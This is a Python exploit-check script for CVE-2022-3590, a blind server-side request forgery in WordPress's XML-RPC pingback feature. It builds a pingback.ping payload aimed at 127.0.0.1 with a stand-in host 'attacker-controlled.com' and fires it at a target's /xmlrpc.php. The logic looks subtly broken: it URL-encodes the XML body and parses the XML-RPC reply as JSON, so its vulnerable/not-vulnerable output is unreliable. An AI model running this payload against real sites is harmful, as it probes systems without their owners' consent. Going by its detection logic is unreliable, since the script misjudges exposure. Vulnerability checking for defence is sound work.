#!/bin/python
# Author: cbk914
import requests
import json
import urllib.parse

def check_cve_2022_3590(url, domain=None):
    """
    Check if a given WordPress website is vulnerable to the CVE-2022-3590 vulnerability by exploiting the blind SSRF in the pingback feature.
    """
    # Set the target URL
    target_url = url + "/xmlrpc.php"

    # Prepare the pingback payload
    if not domain:
        domain = 'attacker-controlled.com'
    pingback_url = 'http://127.0.0.1/'
    payload = f'<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{pingback_url}</string></value></param><param><value><string>http://{domain}/</string></value></param></params></methodCall>'
    encoded_payload = urllib.parse.quote(payload)

    # Send the pingback request
    try:
        response = requests.post(target_url, data=encoded_payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f'[-] An error occurred: {e}')
        return
    
    # Parse the response
    try:
        data = json.loads(response.text)
    except json.decoder.JSONDecodeError:
        data = None
   
    # Check if the website is vulnerable
    if data and 'faultCode' in data and data['faultCode'] == 0:
        print(f'[+] The website {url} is vulnerable to the CVE-2022-3590 vulnerability!')
    else:
        print(f'[-] The website {url} is not vulnerable to the CVE-2022-3590 vulnerability.')

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Check if a given WordPress website is vulnerable to the CVE-2022-3590 vulnerability by exploiting the blind SSRF in the pingback feature.")
    parser.add_argument("-u", "--url", required=True, help="The URL of the WordPress website to check")
    parser.add_argument("-d", "--domain", help="The domain controlled by the attacker")
    args = parser.parse_args()
    check_cve_2022_3590(args.url, args.domain)
